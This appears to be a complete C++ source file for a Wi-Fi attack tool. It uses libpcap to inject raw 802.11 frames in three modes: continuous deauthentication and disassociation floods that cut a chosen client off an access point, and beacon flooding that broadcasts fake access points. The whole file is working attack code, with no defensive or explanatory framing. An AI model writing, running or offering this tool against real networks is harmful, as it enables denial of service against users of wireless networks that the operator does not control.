#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <chrono>
#include <thread>
#include <pcap.h>
#include <unistd.h>

// Standardized 26-byte RadioTap header telling the driver how to structure the raw bytes
const uint8_t radiotap_header[26] = {
    0x00, 0x00, 0x1a, 0x00, 0x2f, 0x40, 0x00, 0xa0, 
    0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0x85, 0x09, 
    0xa0, 0x04, 0xb0, 0x00, 0x10, 0x00, 0x00, 0x00, 
    0x10, 0x00
};

// Converts standard string format "AA:BB:CC:DD:EE:FF" to raw binary bytes
void parse_mac(const std::string& mac_str, uint8_t* mac_bytes) {
    std::sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
                &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], 
                &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}

// Vector 1: Deauthentication Injection
void inject_deauth(pcap_t* handle, const uint8_t* target_mac, const uint8_t* ap_mac) {
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), radiotap_header, radiotap_header + 26);

    uint8_t frame_control[2] = {0xc0, 0x00}; // Management Type, Deauth Subtype
    uint8_t duration[2] = {0x00, 0x00};
    uint8_t reason_code[2] = {0x07, 0x00}; // Class 3 frame received from nonassociated STA

    packet.insert(packet.end(), frame_control, frame_control + 2);
    packet.insert(packet.end(), duration, duration + 2);
    packet.insert(packet.end(), target_mac, target_mac + 6); // Destination Address
    packet.insert(packet.end(), ap_mac, ap_mac + 6);         // Source Address
    packet.insert(packet.end(), ap_mac, ap_mac + 6);         // BSSID
    
    uint8_t seq_ctrl[2] = {0x00, 0x00};
    packet.insert(packet.end(), seq_ctrl, seq_ctrl + 2);
    packet.insert(packet.end(), reason_code, reason_code + 2);

    pcap_sendpacket(handle, packet.data(), packet.size());
}

// Vector 2: Disassociation Injection
void inject_disassoc(pcap_t* handle, const uint8_t* target_mac, const uint8_t* ap_mac) {
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), radiotap_header, radiotap_header + 26);

    uint8_t frame_control[2] = {0xa0, 0x00}; // Management Type, Disassoc Subtype
    uint8_t duration[2] = {0x00, 0x00};
    uint8_t reason_code[2] = {0x06, 0x00}; // Class 2 frame received from nonauthenticated STA

    packet.insert(packet.end(), frame_control, frame_control + 2);
    packet.insert(packet.end(), duration, duration + 2);
    packet.insert(packet.end(), target_mac, target_mac + 6);
    packet.insert(packet.end(), ap_mac, ap_mac + 6);
    packet.insert(packet.end(), ap_mac, ap_mac + 6);
    
    uint8_t seq_ctrl[2] = {0x00, 0x00};
    packet.insert(packet.end(), seq_ctrl, seq_ctrl + 2);
    packet.insert(packet.end(), reason_code, reason_code + 2);

    pcap_sendpacket(handle, packet.data(), packet.size());
}

// Vector 3: Beacon Flooding
void inject_beacon(pcap_t* handle, const std::string& ssid) {
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), radiotap_header, radiotap_header + 26);

    uint8_t frame_control[2] = {0x80, 0x00}; // Management Type, Beacon Subtype
    uint8_t duration[2] = {0x00, 0x00};
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    uint8_t fake_ap_mac[6] = {0x00, 0x11, 0x22, 0x33, (uint8_t)(rand() % 255), (uint8_t)(rand() % 255)};

    packet.insert(packet.end(), frame_control, frame_control + 2);
    packet.insert(packet.end(), duration, duration + 2);
    packet.insert(packet.end(), broadcast_mac, broadcast_mac + 6); 
    packet.insert(packet.end(), fake_ap_mac, fake_ap_mac + 6);    
    packet.insert(packet.end(), fake_ap_mac, fake_ap_mac + 6);    
    
    uint8_t seq_ctrl[2] = {0x00, 0x00};
    packet.insert(packet.end(), seq_ctrl, seq_ctrl + 2);

    uint8_t fixed_params[12] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x64,0x00, 0x11,0x04};
    packet.insert(packet.end(), fixed_params, fixed_params + 12);

    packet.push_back(0x00); 
    packet.push_back(ssid.length()); 
    packet.insert(packet.end(), ssid.begin(), ssid.end());

    uint8_t rates[10] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    packet.insert(packet.end(), rates, rates + 10);

    pcap_sendpacket(handle, packet.data(), packet.size());
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cout << "Usage Options:\n"
                  << "  " << argv[0] << " <interface> deauth <Target_MAC> <AP_MAC>\n"
                  << "  " << argv[0] << " <interface> disassoc <Target_MAC> <AP_MAC>\n"
                  << "  " << argv[0] << " <interface> beacon <SSID_Name>\n";
        return 1;
    }

    std::string interface = argv[1];
    std::string mode = argv[2];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        std::cerr << "[-] Error opening interface: " << errbuf << std::endl;
        return 1;
    }

    std::cout << "=================================================================\n"
              << "[*] WIRELESS ENGINE ACTIVE -> INTERFACE: " << interface << "\n"
              << "[*] Running mode: " << mode << "\n"
              << "=================================================================\n";

    uint64_t count = 0;
    std::srand(std::time(nullptr));

    if (mode == "deauth" && argc >= 5) {
        uint8_t target_mac[6], ap_mac[6];
        parse_mac(argv[3], target_mac);
        parse_mac(argv[4], ap_mac);
        while (true) {
            inject_deauth(handle, target_mac, ap_mac);
            count++;
            if (count % 500 == 0) std::cout << "\r[+] Injected " << count << " Deauth frames..." << std::flush;
            std::this_thread::sleep_for(std::chrono::milliseconds(2));
        }
    } 
    else if (mode == "disassoc" && argc >= 5) {
        uint8_t target_mac[6], ap_mac[6];
        parse_mac(argv[3], target_mac);
        parse_mac(argv[4], ap_mac);
        while (true) {
            inject_disassoc(handle, target_mac, ap_mac);
            count++;
            if (count % 500 == 0) std::cout << "\r[+] Injected " << count << " Disassoc frames..." << std::flush;
            std::this_thread::sleep_for(std::chrono::milliseconds(2));
        }
    } 
    else if (mode == "beacon" && argc >= 4) {
        std::string ssid = argv[3];
        while (true) {
            inject_beacon(handle, ssid);
            count++;
            if (count % 500 == 0) std::cout << "\r[+] Broadcasted " << count << " Fake Beacons..." << std::flush;
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
    }

    pcap_close(handle);
    return 0;
}